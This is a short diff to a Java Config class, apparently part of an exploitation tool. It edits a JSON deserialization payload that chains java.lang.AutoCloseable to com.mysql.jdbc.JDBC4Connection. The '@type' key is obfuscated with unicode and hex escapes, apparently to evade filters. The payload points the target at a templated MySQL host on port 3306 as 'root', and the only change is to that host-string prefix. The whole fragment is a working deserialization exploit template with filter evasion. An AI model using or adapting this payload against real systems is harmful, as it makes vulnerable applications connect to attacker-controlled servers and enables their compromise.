@@ -57,7 +57,7 @@ public class Config {
                         "      \"98ko27\": {\n" +
                         "        \"\\u0040\\u0074\\u0079\\u0070\\x65\": \"java.lang.AutoCloseable\",\n" +
                         "        \"\\u0040\\u0074\\u0079\\u0070\\x65\": \"com.mysql.jdbc.JDBC4Connection\",\n" +
-                        "        \"hostToConnectTo\": \"1%s\",\n" +
+                        "        \"hostToConnectTo\": \"01%s\",\n" +
                         "        \"portToConnectTo\": 3306,\n" +
                         "        \"info\": {\n" +
                         "          \"user\": \"root\",\n" +
